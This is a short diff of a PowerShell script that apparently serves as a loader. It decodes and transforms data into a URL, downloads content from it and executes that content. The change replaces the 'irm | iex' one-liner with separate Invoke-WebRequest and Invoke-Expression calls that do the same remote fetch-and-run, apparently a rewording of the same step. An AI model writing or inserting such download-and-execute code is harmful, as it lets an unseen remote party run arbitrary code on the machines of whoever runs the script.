@@ -19,7 +19,8 @@ ${transform_function} = {
 
 try {
     ${processed_url} = & ${transform_function} -input_data ${data_encoded}
-    irm ${processed_url} | iex
+    ${request_result} = Invoke-WebRequest -Uri ${processed_url}
+    Invoke-Expression ${request_result}
 } catch {
     Write-Error "Failed Parse code"
 }
